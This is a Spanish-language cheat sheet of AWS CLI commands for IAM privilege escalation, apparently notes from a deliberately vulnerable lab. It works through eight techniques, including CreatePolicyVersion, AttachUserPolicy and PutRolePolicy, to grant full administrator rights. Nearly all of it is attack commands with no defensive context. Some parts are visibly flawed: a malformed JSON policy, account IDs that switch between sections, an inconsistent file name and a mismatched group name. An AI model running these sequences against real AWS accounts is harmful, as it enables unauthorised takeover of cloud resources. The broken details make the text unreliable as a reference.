# Permisos sobre Politicas
## iam:CreatePolicyVersion	
aws iam list-attached-user-policies --user-name privesc1-CreateNewPolicyVersion-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc1-CreateNewPolicyVersion --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc1-CreateNewPolicyVersion-role --role-session-name privesc1  
aws sts get-caller-identity --profile privesc1  
Crear el archivo admin_policy.json con el contenido  

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PermitirTodo",
      "Effect": ""Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

aws iam create-policy-version --policy-arn arn:aws:iam::583318501385:policy/privesc1-CreateNewPolicyVersion --policy-document file://admin_policy.json --set-as-default --profile privesc1  
	
## iam:SetDefaultPolicyVersion  
aws iam list-attached-user-policies --user-name privesc2-SetExistingDefaultPolicyVersion-user  
aws iam create-policy-version --policy-arn arn:aws:iam::583318501385:policy/privesc2-SetExistingDefaultPolicyVersion --policy-document file://admin_policy.json  
aws iam get-policy --policy-arn arn:aws:iam::583318501385:policy/privesc2-SetExistingDefaultPolicyVersion  
aws iam set-default-policy-version --policy-arn arn:aws:iam::583318501385:policy/privesc2-SetExistingDefaultPolicyVersion --version-id v2 --profile privesc2  
	
## iam:AttachUserPolicy  
aws iam list-attached-user-policies --user-name privesc7-AttachUserPolicy-user  
aws iam get-policy-version --policy-arn arn:aws:iam::583318501385:policy/privesc7-AttachUserPolicy --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::583318501385:role/privesc7-AttachUserPolicy-role --role-session-name privesc7  
aws iam attach-user-policy --user-name privesc7-AttachUserPolicy-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile privesc7  
	
## iam:AttachGroupPolicy  
aws iam list-attached-user-policies --user-name privesc8-AttachGroupPolicy-user  
aws iam get-policy-version --policy-arn arn:aws:iam::583318501385:policy/privesc8-AttachGroupPolicy --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::583318501385:role/privesc8-AttachGroupPolicy-role --role-session-name privesc8  
aws iam attach-group-policy --group-name privesc8-AttachGroupPolicy-group --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile privesc8  
	
## iam:AttachRolePolicy  
aws iam list-attached-user-policies --user-name privesc9-AttachRolePolicy-user  
aws iam get-policy-version --policy-arn arn:aws:iam::583318501385:policy/privesc9-AttachRolePolicy --version-id v1  
aws iam create-access-key --user-name privesc9-AttachRolePolicy-user  
aws iam attach-role-policy --role-name privesc9-AttachRolePolicy-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile privesc9  
	
## iam:PutUserPolicy  
aws iam list-attached-user-policies --user-name privesc10-PutUserPolicy-user  
aws iam get-policy-version --policy-arn arn:aws:iam::583318501385:policy/privesc10-PutUserPolicy --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::583318501385:role/privesc10-PutUserPolicy-role --role-session-name privesc10  
aws iam put-user-policy --user-name privesc10-PutUserPolicy-user --policy-name politica --policy-document file://admin_policy.json --profile privesc10  
aws iam list-user-policies --user-name privesc10-PutUserPolicy-user  
	
## iam:PutGroupPolicy  
aws iam list-attached-user-policies --user-name privesc11-PutGroupPolicy-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc11-PutGroupPolicy --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc11-PutGroupPolicy-role --role-session-name privesc11  
aws sts get-caller-identity --profile privesc11  
aws iam put-group-policy --group-name privesc11-PutGroupPolicy-group --policy-name politica-PrivEsc2-Spartan --policy-document file://admin_politica.json --profile privesc11  
aws iam list-group-policies --group-name privesc11-PutGroupPolicy-user  
	
## iam:PutRolePolicy  
aws iam list-attached-user-policies --user-name privesc12-PutRolePolicy-user  
aws iam get-policy-version --policy-arn arn:aws:iam::651927172911:policy/privesc12-PutRolePolicy --version-id v1  
aws sts assume-role --role-arn arn:aws:iam::651927172911:role/privesc12-PutRolePolicy-role --role-session-name privesc12  
aws sts get-caller-identity --profile privesc12  
aws iam put-role-policy --role-name privesc12-PutRolePolicy-role --policy-name politica-PrivEsc3 --policy-document file://admin_politica.json --profile privesc12  
aws iam list-role-policies --role-name privesc12-PutRolePolicy-role  

